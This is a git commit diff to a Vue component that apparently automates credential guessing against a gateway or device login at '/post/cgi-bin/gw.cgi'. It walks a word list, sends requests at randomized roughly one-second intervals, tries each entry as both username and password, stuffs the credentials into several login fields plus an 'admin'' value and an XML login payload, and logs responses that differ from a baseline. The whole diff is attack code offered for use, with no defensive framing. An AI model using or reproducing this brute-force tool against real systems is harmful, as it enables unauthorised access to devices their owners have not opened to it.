1d27a2f70734ba2fcda10659a8aadd961ffaa7da
jackdizhu <376365334@qq.com>
2018-04-17 15:30:48 +0800

    配置保存

--- src/page/v_test/VPost.vue
+++ src/page/v_test/VPost.vue
@@ -20,11 +20,12 @@
     },
     methods: {
       start: function () {
-        for (let i = 0; i < key.wd.length; i++) {
+        let _arr = key.wd
+        for (let i = 0; i < _arr.length; i++) {
           // 生成随机数 大约一秒 请求一次
           let _t = Math.ceil(Math.random() * 200) + 900
           setTimeout(() => {
-            this.post(this.usr, key.wd[i])
+            this.post(_arr[i], _arr[i])
           }, _t * i)
         }
       },
@@ -35,7 +36,16 @@
           url: '/post/cgi-bin/gw.cgi',
           type: 'GET',
           params: {
+            'PORTAL_LANG': 'cn',
+            'cmd': 'Login',
+            '_CACHE_LOGIN_TIME_': new Date().getTime(),
+
             admin: `admin'`,
+            userid: `${usr}`,
+            userName: `${usr}`,
+            password: `${pwd}`,
+            pwd: `${pwd}`,
+            USER_PASSWORD: `${pwd}`,
             xml: `<juan ver="" squ="" dir=""><envload type="0" usr="${usr}" pwd="${pwd}"/></juan>`,
             _: new Date().getTime()
           }
@@ -44,9 +54,9 @@
           if (typeof res === 'string') {
             res = res.replace(/[\r\n\t]/g, '')
           }
-          // console.log(res)
+          console.log(res)
           if (res !== str) {
-            console.log(`usr="${usr}" pwd="${pwd}"`)
+            // console.log(`usr="${usr}" pwd="${pwd}"`)
           }
         })
       }
